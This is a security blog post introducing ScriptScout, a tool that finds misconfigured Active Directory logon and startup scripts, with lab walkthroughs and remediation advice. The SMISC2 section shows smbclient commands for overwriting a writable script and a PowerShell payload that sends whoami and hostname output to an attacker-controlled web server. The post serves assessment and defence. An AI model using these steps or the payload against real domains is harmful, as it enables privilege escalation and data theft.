---
title: "Introducing ScriptScout: Transforming Smooth AD Automation Scripts into Attack Vectors"
date: 2025-11-22T12:50:00+02:00
draft: false
toc: false
description: "Identify exploitable misconfigurations in AD Automation Scripts with ScriptScout."
author:
  name: "Marco Zufferli"
keywords: ["AD automation scripts","utomation scripts","ScriptScout","SMISC1","SMISC2","SMISC3","SMISC4","SMISC5"]
summary: "This article introduces ScriptScout, a Python-based assessment tool that automatically identifies five classes of misconfigurations (SMISC1–SMISC5) - for now - in Active Directory \"Automation scripts\" (logon script, logoff script, startup script, shutdown script, GPO Scheduled Task script) stored on SYSVOL and NETLOGON, demonstrating how these weaknesses can be weaponized for privilege escalation and persistence and how defenders can detect and remediate them."
---
---
#### Table of Contents:
- [TL;DR](#30)
- [What's an Active Directory Automation Script and How to Configure It](#31)
  - [Group Policy Script](#1)
  - [Logon Script via ScriptPath](#2)
  - [GPO Scheduled Task](#3)
- [Abuse Misconfigurated AD Automation Script](#32):
  - [SMISC1](#9): Plaintext Credentials Stored Inside Scripts.
  - [SMISC2](#14): Find a Script that execute a remote file hosted on a SMB Share, where the file itself or its parent folder / SMB Share has excessive permissions (so the file inherits those permissions).
  - [SMISC3](#15): Find a Script that executes a non-existent remote file hosted on an SMB share, where its parent folder / SMB share has excessive permissions.
  - [SMISC4](#33): The Script itself contained inside the SYSVOL / NETLOGON has excessive permission.
  - [SMISC5](#26): Find a Script that map a SMB share & / OR execute a remote file hosted on a SMB Share, where the machine that expose that SMB Share does not exist anymore.
    - [SMISC5 -> Deep Dive](#22) - An Exploitation Edge Case.
- [ScriptScout Tips & Tricks](#34)
- [Outro](#35)
- [Legal Disclaimer](#37)
- [References](#36)
---

# **Introducing ScriptScout: Transforming Smooth AD Automation Scripts into Attack Vectors**

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/foto1.jpg" position="center" style="border-radius: 8px;">}}

<span id=30>

## **TL;DR** 
In an Active Directory scenario, it is possible to configure the automatic execution of a specific script following a particular event, these scripts are called "AD Automation Script" which *typically* are: Logon Script, LogOff Script, StartUp Script and Shutdown Script; if they are configured incorrectly, an attacker, broadly speaking, is able to impersonate the user who executes such Automation Script and this allows the attacker to perform Privilege Escalation and / or Persistency.

A total of 5 misconfigurations have been identified and they have been sequentially classified with the term SMISC (Script MISCconfiguration), in order to identify these SMISC automatically i have developed a Python tool called "[ScriptScout](https://github.com/MarcoZufferli/ScriptScout)".

<span id=31>

## **What is an Active Directory Automation Script and How to Configure It**

In an Active Directory scenario it is possible to configure the automatic triggering of a specific script following a specific event, these scripts are called “AD Automation Script” and they in an AD scenario can be configured either via GPOs or via the “ScriptPath” property of a “Users” object.

Depending on the scenario of when the script execution occurs, the latter takes a different name:

<span id=6>

- **Logon Script (User Logon)**: A script executed automatically when a domain user authenticates on a domain-joined computer, specifically, that script will be executed by the computer itself impersonating the domain user who has just logged in.

<span id=19>

- **Logoff Script (User Logoff)**: A script executed automatically when a domain user logs off on a domain-joined computer, specifically, that script will be executed by the computer itself impersonating the domain user who has just logged off.

<span id=11>

- **Startup Script (Computer Startup)**: A script executed automatically when a computer is started, specifically, that script will be executed locally by the user “NT Authority\System” (the corresponding Computer Account will be used if network interactions are required).

- **Shutdown Script (Computer Shutdown)**: A script executed automatically when a computer is shut down, specifically, that script will be executed by the user “NT Authority\System” (the corresponding Computer Account will be used if network interactions are required).

<span id=4>

> I want to highlight that **using "GPO Scheduled Task” it is possible to execute specific scripts** (also considered as “Automation Scripts”) **even in other scenarios not listed above** (for example they can be triggered on a “On Workstation Lock” event of the computer, or with a fixed recurrence in time and so on), **in that case, the account that will execute the script depends on how the GPO Scheduled Task has been configured.**

Specifically, GPOs allow the configuration of **ALL** the types of “Automation Script” listed above and more, whereas the “ScriptPath” property of a “Users” object is only able to configure a “Logon Script (User Logon)”.

Below i detail the 3 methodologies that Active Directory provides to configure an “Automation Script”, so: **"[Group Policy Script](#1)"**, **"[Logon Script via ScriptPath](#2)"** and **"[GPO Scheduled Task](#3)"**.

<span id=1>

## **Group Policy Script**

The automatic execution of specific scripts in certain scenarios is an extremely convenient feature for system administrators, especially when configured through GPOs, because they can centrally manage everything from the Group Policy Management Console; for example, they can configure the mapping of a specific File Share every time a domain user logs into a machine, or upon computer startup, perform the deletion of local temporary files, and so on.

Specifically, in this article, a GPO that uses "Policies -> Windows Settings" to configure a Logon, Logoff, Startup, or Shutdown script will be called a "Group Policy Script" and depending on the type of "Automation Script" being deployed, the corresponding "Group Policy Script" may be called a "GPO Logon Script", "GPO Startup Script" and so on.

> The term “Group Policy Script” (and therefore names like "GPO Logon Script" and so on) is used to distinguish it from a "GPO Scheduled Task", which can also be used to deploy an Automation Script.

In this section, we will focus on the creation of the GPO Logon Script, as this is one of the most commonly used scenarios in an AD context:

1. **Access the Group Policy Management Console, create a GPO, and link it to the relevant OU / Site / Domain**

    In this scenario, we will create a GPO that configures a specific Logon Script (so it will be a GPO that will exclusively affect domain users - User Objects) by associating it directly to the domain.

    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_1.png" position="center" style="border-radius: 8px;">}}
    <br>
    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_2.png" position="center" style="border-radius: 8px;">}}

   In other words, this GPO Logon Script will affect all domain users.

2. **Then click "edit" and double-click on "User Configuration" -> "Policies" -> "Windows Settings" -> "Script (Logon / Logoff)" -> "Logon"**
  
    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_3.png" position="center" style="border-radius: 8px;">}}

  > Instead, if we were to go to "Computer Configuration" -> "Policies" -> "Windows Settings" -> "Script (Startup / Shutdown)," we could respectively configure either a Startup or Shutdown Script; in that way, when any machine joined to the domain performed those actions, the corresponding script would be executed; in our example, however, we are configuring a Logon Script.

3. **Click "Properties" on "Logon" and configure the Logon Script**

    A window will appear where it will be possible to enter the logon script:

  - The "Script" section allows you to enter files with the extensions ".bat", ".cmd," ".vbs" (VBScript), and ".js" (JScript).

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_4.png" position="center" style="border-radius: 8px;">}}

  - The "PowerShell Scripts" section allows you to enter a file with the ".ps1" extension.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_5.png" position="center" style="border-radius: 8px;">}}

  In our case, we are going to configure the following PowerShell Script "logon_script.ps1"

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_6.png" position="center" style="border-radius: 8px;">}}

  In order to do this, click "Show Files" from "PowerShell Script" section which will automatically open the folder pointing to the SYSVOL path containing the newly created GPO, specifically it will point to the location where we must insert our script, so now we can do a copy of the "logon_script.ps1" file and paste it into that location.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_7.png" position="center" style="border-radius: 8px;">}}

  <br>

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_8.png" position="center" style="border-radius: 8px;">}}

  Now click "Add", "Browse", then the previously mentioned SYSVOL path will open and you will need to select the "logon_script.ps1" script.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_9.png" position="center" style="border-radius: 8px;">}}

  Then do "Apply" and "Ok".

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_10.png" position="center" style="border-radius: 8px;">}}

Now you have created a "GPO Logon Script".

As for any other GPOs, several hours will be required to propagate this GPO throughout the whole domain, for this reason, since we are within our laboratory we will force this update for example on the machine THEPUNISHER.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_11.png" position="center" style="border-radius: 8px;">}}

Once this is done, everything has been completed.

In this scenario, since a "GPO Logon Script" (so only domain users will be affected) has been directly associated with the domain, when any domain user logs into any computer, the relative computer will execute the Logon Script by impersonating the user who has just logged in, so in this case the machine will perform a ping to the DC; as shown in the following screenshot when a user logs into the THEPUNISHER machine (192.168.52.132) 10 "ICMP Echo Request" will be executed toward the attacking machine (192.168.52.129).

> If the script does not include spawning elements visible in the GUI, the script will run entirely in the background and therefore be invisible to the user, exactly as in this case.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_12.png" position="center" style="border-radius: 8px;">}}

  <br>

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/gpo_13.png" position="center" style="border-radius: 8px;">}}

> Since a "GPO Logon Script" affects only domain users, if this "GPO Logon Script" is associated with an OU, all user objects (do all domain user) contained within it will be affected by the GPO; consequently, if the OU does not contain any domain users, that "GPO Logon Script" will have no effect.
>
>  Furthermore i want to highlight that this behavior occurs every time the impacted domain users log in to any computer (obviously, the domain user must have permission to perform the login), and this also means that it is not necessary to include "Computer" objects within the relevant OU to make the "GPO Logon Script" effective.

<span id=2>

## **LogonScript via ScriptPath Property**

In an Active Directory context a Logon Scripts can also be configured using the "[scriptPath](https://learn.microsoft.com/en-us/windows/win32/adschema/a-scriptpath)" property that each "User" object (domain user) possesses.

When Active Directory was first introduced and early Windows OS were still common (such as Windows 95, 98, and NT), Group Policy did not yet exist and so the scriptPath property was created, [this property allow administrators to assign a specific Logon Script to a domain user](https://web.archive.org/web/20250826232819/https://www.rlmueller.net/LogonScriptFAQ.htm); this legacy feature is still supported today for backward compatibility and remains a commonly used method for configuring Logon Scripts.

> If a Logon Script is configured via scriptPath on a user and another Logon Script is configured via "[GPO Logon Script](#1)" for the same user, then on Windows machines newer than Windows 2000, both Logon Scripts will run automatically when that user logs in.

So let's make an example:
<br><br>

1. **Insert the Logon Script inside the SYSVOL**

   Insert the script that must be executed during "Logon" inside the folder "`\\<DC-hostname>\SYSVOL\<domain>\script\`" of the Domain Controller, in our scenario, the file "logonscript_scriptPath.bat" which maps a network share has been correctly inserted in this location.

    > The supported extensions are ".bat", ".cmd" and ".vbs" (from my tests, ".ps1" is not allowed).

    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/logon_1.png" position="center" style="border-radius: 8px;">}}

    By default the Domain Controller will also expose the folder "`\\<DC-hostname>\NETLOGON`" which is simply an alias of the folder "`\\<DC-hostname>\SYSVOL<domain>\script`", in fact, by browsing it you will immediately find the file you just uploaded.

    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/logon_2.png" position="center" style="border-radius: 8px;">}}

2. **Configure the Logon Script for a specific domain user.**

    Using the [ADUC](https://www.varonis.com/blog/active-directory-users-and-computers) go to the desired "User" object (so the domain user) and inspect the "Profile" tab, then, in the "Logon Script" section enter only the name of the file previously uploaded on the SYSVOL.

    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/logon_3.png" position="center" style="border-radius: 8px;">}}

    With these configurations, by default, the script "logonscript_scriptPath.bat" will be searched inside the "`\\<DC-hostname>\NETLOGON`" which by design it's able to contain all "Logon Scripts" executed with this functionality.

    Specifically, setting this configuration the DC will automatically modify the "scriptPath" property of the corresponding "Users" object.

    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/logon_4.png" position="center" style="border-radius: 8px;">}}

Now, every time the domain user "MARVEL\pparker" logs in on any domain joined machine, the machine where the user logs in will retrieve the Logon Script "logonscript_scriptPath.bat" located at `\\<DC-hostname>\\NETLOGON\\`
 (which is accessible by anyone just like SYSVOL) and execute it by impersonating the user who has just logged in, in this case, the user "MARVEL\pparker".

In our specific case, as soon as the user MARVEL\pparker authenticates on the SPIDERMAN computer (any computer where this domain user "MARVEL\pparker" could log in would work), the network share "business_folder" hosted on the machine THEPUNISHER will be automatically mapped.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/logon_5.png" position="center" style="border-radius: 8px;">}}

<span id=3>

## **GPO Scheduled Task**

It is possible to use a GPO to associate domain joined computers or domain users with a “Scheduled Task,” which, by its nature, will automatically execute a Task (an action) under a specific scenario; in this context, this type of GPO is called a “GPO Scheduled Task”.

Since "GPO Scheduled Tasks" are extremely flexible, when properly configured they can also automatically execute an "Automation Script" after a specific trigger, in a manner similar to the [Group Policy Script](#1) described earlier but with even greater flexibility ([because you are not limited anymore to the standard scenario](#4))

To configure a "GPO Scheduled Task", as with any other GPO, open the "Group Policy Management Console," create a new GPO, link it to the domain or desired OU, then go to "Edit" -> "Computer Configuration or User Configuration" -> "Preferences" and finally "Scheduled Task."

In this scenario, a GPO named "GPO_ComputerScheduledTask" is configured and associated with the entire domain and it sets up a Scheduled Task called "ComputerScheduledTask" for computers objects, so let’s analyze how it has been set up to understand its behaviour & eventually how to create a new one.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_1.png" position="center" style="border-radius: 8px;">}}

> The configuration for a "GPO Scheduled Task" associated with computers is extremely similar to one for domain users.
> 
> Because "GPO Scheduled Tasks" are highly flexible, their behavior is generally analogous whether linked to computers or domain user with only minor differences, for this reason, in order to avoid repetitive explanations, details about "GPO Scheduled Tasks" linked to domain users will not be covered.

In our scenario, this Scheduled Task called "ComputerScheduledTask" will be executed with the local permissions of "NT Authority\System".

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_2.png" position="center" style="border-radius: 8px;">}}

Specifically, it will be executed when an "On Workstation Lock" event occurs by any user, in other words, whenever any user locks the computer (affected by the "GPO Scheduled Task"), this Scheduled Task will be triggered.

> e.g. the "On Workstation Lock" event is not something that it's possible to setup using the "[Group Policy Script](#1)"

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_3.png" position="center" style="border-radius: 8px;">}}

Once triggered, this "Scheduled Task" will execute a specific action, in this case, it will launch a program, specifically, it has been configured to execute "powershell.exe" running the file "misc4_logonscript_2.ps1" located in SYSVOL

> The practice of executing scripts placed inside the SYSVOL is very common, since the files inside it are accessible from any domain joined machine making them well suited for such scenarios.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_4.png" position="center" style="border-radius: 8px;">}}

This script will perform an HTTP request and perform a ping.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_5.png" position="center" style="border-radius: 8px;">}}

As a practical demonstration, for example if any user performs the "On Workstation Lock" event on the SPIDERMAN joined machine, the latter will execute (impersonating the "NT Authority\SYSTEM" user) the Scheduled Task "ComputerScheduledTask" which will run with PowerShell the file "misc4_logonscript_2.ps1" located on SYSVOL.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_6.png" position="center" style="border-radius: 8px;">}}

> Finally, i want to highlight that when a "GPO Scheduled Task" is configured, inside the following path on SYSVOL: `\\<dc_hostname>\SYSVOL\Policies\<GUID>\<Machine OR Users>\Preferences\ScheduledTasks\` there will be a file named "Scheduled.Tasks.xml" which will detail the operation of the corresponding "Scheduled Task", in this case, in fact, it's possible to observe that the script named "misc4_logonscript_2.ps1" will be executed with the SYSTEM user:
>
><br>
> {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/sche_7.png" position="center" style="border-radius: 8px;">}}

<span id=32>

## **Abuse Misconfigurated AD Automation Script**

These "Automation Scripts" are generally used to map file shares, add printers, update software, delete temporary files, log the timestamp of a successful login, execute specific commands, configure the desktop background and so on; therefore they prove to be very powerful and flexible and consequently, if misconfigured, they become potential attack vectors for an attacker, this section focuses on the main misconfigurations that occur in an "Automation Script" that maps a network share (SMB) or executes a remote file hosted always on a network share (SMB).

Since "Automation Scripts" configured using all methods (through "[Group Policy Script](#1)", "[ScriptPath](#2)" and "[GPO "Scheduled Task](#3)") are automatically placed inside the SYSVOL folder (so also inside NETLOGON), which i want to remind that's by default readable by the "Authenticated Users" group (and therefore by any authenticated "Principal" including an authenticated attacker), an attacker impersonating ANY domain user (even with minimal privileges) could retrieve these "Automation Scripts" and analyze them offline to identify potential misconfigurations.

To automate these checks, i have developed "[ScriptScout](https://github.com/MarcoZufferli/ScriptScout)", a tool that will enumerate (it will NOT perform exploitation) the various misconfigurations identified within the infrastructure that i classified from SMISC1 (Script Misconfiguration 1) to SMISC5 (Script Misconfiguration 5).

<span id=5>

> For OPSEC motivation and thus to avoid further querying the DC, ScriptScout will not execute any LDAP queries to report which OU is associated with the GPO that set up the vulnerable "Automation Script" or which domain user is associated with the "Logon Script" via ScriptPath, so, these verification must be performed manually using other tools such as BloodHound.

> When performing attacks from a Linux machine NOT joined to the domain, although it is not mentioned in subsequent examples, when using SMBClient and targeting the machines using their hostname, in reality i have resolved their machine name by entering it in the "/etc/hosts" file, that said SMBClient still supports connecting using the IP.

<span id=9>

## **SMISC1: Plaintext Credentials Stored Inside Scripts.**

If elevated privileges (typically administrative) are required to access an SMB File Share, but a specific domain user lacking those privileges needs to map that share, administrators often avoid granting the necessary privileges directly to that user; instead, they configure a Logon Script that uses the "net use" command to map the target network share by embedding the required credentials in plain-text within the command.

Although these actions are particularly convenient from an administrative standpoint for managing an infrastructure, since "Automation Scripts" are accessible to anyone, an attacker could retrieve these scripts and thus also obtain those credentials specified in plaintext.

By running ScriptScout, it can be observed that it has identified two different Logon Scripts (one configured via [Group Policy Script](#1), the other one configured via the ["ScriptPath" property](#2)) that map network SMB shares specifying domain credentials in clear text such as: "helpdeskadmin"-"Password1234!" & "tstark"-"Password123" inside the "net use" command.

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/1.png" position="center" style="border-radius: 8px;">}}

Indeed, as a further verification, if we manually inspect these "Automation Scripts" inside SYSVOL, we will find credentials hardcoded within the "net use" command.

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/2.png" position="center" style="border-radius: 8px;">}}

<br>

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/3.png" position="center" style="border-radius: 8px;">}}

Based on the permissions assigned to the domain user retrieved, the attacker can proceed with further actions; in this case, "MARVEL\tstark" is a "Domain Admin" and consequently the attacker is able to compromise the entire domain.

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/4.png" position="center" style="border-radius: 8px;">}}

**Remediation**: Use the GPO Drive Mapping ([1](https://v2cloud.com/blog/how-to-map-network-drives-with-gpo-map), [2](https://activedirectorypro.com/map-network-drives-with-group-policy/)); alternatively, remove any plaintext credentials and provide the end user with the necessary permissions to access the target SMB share.​​

<span id=14>

## **SMISC2: Find a Script that execute a remote file hosted on a SMB Share, where the file itself or its parent folder / SMB Share has excessive permissions (so the file inherits those permissions).**

Before proceeding, it is important to be aware that on Windows, both [SMB Share permissions and NTFS permissions exist](https://superuser.com/questions/897180/whats-the-difference-between-sharing-and-advanced-sharing-in-windows-server-200); if the permissions at the SMB Share level (network level) are overly permissive (e.g. Everyone Group - FullControl) and the same is true at the NTFS level (e.g. Everyone Group - FullControl), then an attacker could remotely modify the file targeted by the "Automation Script" and thereby indirectly execute arbitrary commands by impersonating the victim domain user that will executes this "Automation Script".

> ScriptScout is only able to enumerate NTFS permissions and not SMB Share (network) permissions, so the tool's output will be exploitable only if also network level permissions allow it (to determine this, a manual check is required; in other words, it is sufficient to attempt the modification, which means to perform an attack attempt, if the attempt is successful it will be confirmed that excessive SMB share permissions are also present).

By running ScriptScout, it can be observed that the "run.bat" file located on the "business_folder" SMB share  (specifically at `\\192.168.52.132\business_folder\magement_file\run.bat`) grants "FullControl" to the "Everyone" or "Domain Users" group, so to any domain user; as a consequence of this, an attacker impersonating any domain user could modify the "run.bat" file by inserting arbitrary commands, which would then be executed by the victim user (so a domain user for Logon & LogOff Scripts, the local "NT\ Authority System" user for Start & Shutdown Scripts and any user type in the case of GPO Scheduled Tasks).

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/5.png" position="center" style="border-radius: 8px;">}}

<span id=10>

> This misconfiguration is due to the fact that the SysAdmin assigned "FullControl" permissions (in reality, only "Write" permission is sufficient to conduct an attack and ScriptScout also handles this scenario) to the "Everyone" or "Domain Users" group on the SMB share "business_folder" (so the file "run.bat" contained within inherits this permission), or on a parent folder of the file "run.bat" (and thus the "run.bat" file inside inherits the permission), or directly on the "run.bat" file itself; the "ScriptScout" tool covers all these scenarios.

Furthermore, since ScriptScout saves all the "Automation Scripts" inside the "script_collected" folder created in the current directory from which the tool has been launched, by performing a simple "grep" it is possible to determine which specific "Automation Script" contains the execution of the remote file located at `\\192.168.52.132\business_folder\management_file\run.bat`; in this case, by examining the path "\policies\GUID\User\Script\Logon," we can deduce that this "Automation Script" is actually a [Logon Script](#6) configured via [GPO (specifically as a Group Policy Script)](#1).

```
# grep <filename> ./scripts_collected/
```

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/6.png" position="center" style="border-radius: 8px;">}}

> In this case we also found out that the IP "192.168.52.132" is the "THEPUNISHER" machine.

<span id=8>

Subsequently, to determine which users are impacted by this "Automation Script" (in this case, a Logon Script) and therefore identify the potential victims of the SMISC2 attack, [as previously mentioned](#5), the tester must enumerate this information manually for example using BloodHound; since the target in this example is within my home laboratory, we can observe how this [GPO](#1) with that GUID is actually named "smisc2_automationscript" (DisplayName) and is directly linked to the MARVEL.local domain, it means that ALL domain users (because it is a Logon Script) that perform a "[Logon](#6)" will becomes the victims of this attack.

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/7.png" position="center" style="border-radius: 8px;">}}

> If the Automation Script vulnerable to SMISC2 is located within "`\\<dc-hostname>\SYSVOL\Scripts\<SMISC2_vulnerable_filename>`", this means that such Automation Script can be executed either through the ["ScriptPath" property](#2) of a domain user or through a [GPO Scheduled Task](#3), in the first instance the attacker will need to manually retrieve and correlate data to understand which user is impacted ([in a manner similar to what has already been described](#8)), in the second case, since ScriptScout also downloads all the "ScheduledTask.xml" files inside the "ScheduledTaskConf_collected" folder, the attacker by running a grep can quickly identify if such "Automation Script" vulnerable to SMISC2 is triggered via "GPO Scheduled Task", in this scenario by analyzing the identified "ScheduledTask.xml" file it will also be possible to understand the execution logic (e.g. trigger "On Workstation Lock") and with which user the vulnerable Automation Script will be executed.

Now the attacker needs to verify if he also has permissions at the SMB (network) level and to do this he could simply attempt to edit the target file effectively performing the attack, if as in this case the result of the modification is positive then the attack has succeeded and in this way we have indirectly confirmed that an attacker possesses all the necessary permissions.

So:

1. **We use, for example, "smbclient" to first download `\\THEPUNISHER\business_folder\management_file\run.bat`:**

    ```
    # smbclient //<hostname>/<fileshare_smb> -U '<domain>\\<domain_user>%<password>' -c "get <fullpath_automationscript> <local_file>/<automationscript_name>"
    ```

    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/8.png" position="center" style="border-radius: 8px;">}}

2. **Append** (DO NOT remove data contained within / DO NOT overwrite the file content – this would cause a service disruption) **the malicious content, for example the following arbitrary code:**

    ```
    powershell -Command "$data = (whoami) + '|' + (hostname); $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($data)); Invoke-WebRequest -Uri \"http://<ip_attacker>/?a=$encoded\" -UseBasicParsing"
    ```

    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/9.png" position="center" style="border-radius: 8px;">}}

    This code executes the "whoami" and "hostname" commands and sends the output in base64 format to a Web Server hosted by the attacker, in reality the attacker could create local accounts on the machine (if the impersonated user has sufficient privileges), spawn a Reverse Shell, execute a beacon to establish a connection to the C2 and so on.

    > The syntax of the arbitrary command to be inserted inside the file to be modified varies according to the language it uses, for example if you modify a .VBS file, the code indicated above may not work.

<span id=9>

3. **We use, for example, "smbclient" to finally upload and thus overwrite the original "Automation Script" with the malicious "Automation Script".**

    ```
    # smbclient //<hostname>/<fileshare_smb> -U '<domain>\\<domain_user>%<password>' -c "put <local_file>/<automationscript_name> <fullpath_automationscript>"
    ```
    
    {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/10.png" position="center" style="border-radius: 8px;">}}

Now, after the GPO modification has propagated correctly (by default this takes 90 minutes, otherwise if you have access to the machine you can use the "gpupdate /force" command), if for example the user "MARVEL\pparker" (we know that the [GPO is applied at the domain level](#8) and therefore affects every domain user) logs for example onto the SPIDERMAN machine, the machine impersonating the domain user "MARVEL\pparker" will execute the LogonScript "misc2_logonscript", consequently, it will then execute the "run.bat" file containing the malicious PAYLOAD previously injected by the attacker, so following this event we may observe how the attacker has actually succeeded in carrying out data exfiltration.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/11.png" position="center" style="border-radius: 8px;">}}

<span id=13>

As further demonstration of this, since in this scenario we are performing everything in our own lab environment, by inspecting the various permissions we can see how they are misconfigured both at the SMB (network share) level and at the NTFS level.

Below are the NTFS-level permissions (which ScriptScout is able to detect), specifically, the FullControl permission has been granted directly to the "business_folder" share and consequently the "run.bat" file has inherited all those permissions.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/12.png" position="center" style="border-radius: 8px;">}}

This is also reflected in the following screenshot.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/13.png" position="center" style="border-radius: 8px;">}}

Below are the permissions at the SMB (network share) level (which ScriptScout is NOT able to detect), as you can see the "Everyone" group has FullControl permissions and in fact the [modification was successful](#9).

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/14.png" position="center" style="border-radius: 8px;">}}

This is also reflected in the following screenshot.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/15.png" position="center" style="border-radius: 8px;">}}

> If the Sysadmin had granted excessive Read & Write permissions EXCLUSIVELY on the "run.bat" file and not on its Parent Folder or directly on the SMB Share, by default the attacker would NOT have permission to list the contents of the "business_folder" SMB Share and as a result, this would apparently block exploitation; that said, in reality, since the attacker knows the entire relative path of the vulnerable file (since it is referenced within the "Automation Script"), [as previously mentioned](#10), he could still download or overwrite it if targeted directly.
>
> <p> {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/16.png" position="center" style="border-radius: 8px;">}} </p>

**Remediation**: Analyze all the "Automation Scripts" present within the infrastructure, retrieve the SMB paths contained within them, and verify that the share files themselves (as well as the folders and files inside the share) do not have excessive permissions, because if an "Automation Script" executes a file with excessive permissions an attacker could perform the type of attack called SMISC2.

<span id=15>

## **SMISC3: Find a Script that executes a non-existent remote file hosted on an SMB share, where its parent folder / SMB share has excessive permissions.**

SMISC3 follows the same initial considerations already made for [SMISC2](#9), therefore instead of rewriting everything, it is recommended to review that section.

By running ScriptScout, it is possible to observe how an Automation Script attempts to execute the remote file "not_exist_file.bat" located on the SMB share named "business_folder" (specifically at the path `\\192.168.52.132\business_folder\magement_file\not_exist_file.bat`), since this file does NOT exist and its parent folder or the SMB share itself grants "FullControl" permission to the "Authenticated Users" group, an attacker impersonating any domain user or Computer Account could first create the "not_exist_file.bat" file, insert the malicious payload inside it, and finally upload it to the specific path where the Automation Script will attempt to call it; in this way, the malicious file will later be executed by the victim user (so a domain user for Logon & LogOff Scripts, the local “NT\ Authority System” user for Start & Shutdown Scripts and any user type in the case of GPO Scheduled Tasks), and the attack will be successful.

  {{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/17.png" position="center" style="border-radius: 8px;">}}

  > This misconfiguration is due to the fact that the SysAdmin assigned “FullControl” permissions (in reality, only “Write” permission is sufficient to conduct an attack and ScriptScout also handles this scenario) to the "Authenticated Users" group on the SMB share “business_folder”, for this reason the attacker has properly permission to create and add any arbitrary file inside it.

  Furthermore, since ScriptScout saves all "Automation Scripts" inside the "script_collected" folder created in the current directory from which the tool has been launched, by performing a simple "grep" it is possible to determine which "Automation Script" contains the execution of the remote file located at `\\192.168.52.132\business_folder\magement_file\not_exist_file.bat`; in this case, by examining the path "\policies\GUID\Machine\Startup" we understand that such "Automation Script" is actually a [Startup Script](#11) configured through [GPO (specifically as a Group Policy Script)](#1).

```
# grep <filename> ./scripts_collected/
```

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/18.png" position="center" style="border-radius: 8px;">}}

> In this case we also found out that the IP “192.168.52.132” is the “THEPUNISHER” machine.

<span id=12>

Subsequently, to determine which users are impacted by this "Automation Script" (in this case, a Startup Script) and therefore identify the potential victims of the SMISC3 attack, [as previously mentioned](#5), the tester must enumerate this information manually for example using BloodHound; since the target in this example is within my home laboratory, we can observed how this [GPO](#1) with that GUID is actually named "smisc3_automationscript" (DisplayName) and is directly linked to the MARVEL.local domain, it means that ALL domain joined Computers (because it is a Startup Script) that perform a "[StartUp](#11)" will becomes the victim of this attack.

{{< image src="/introducing_scripscout:transforming_smooth_ad_automation_scripts_into_attack_vectors/19.png" position="center" style="border-radius: 8px;">}}

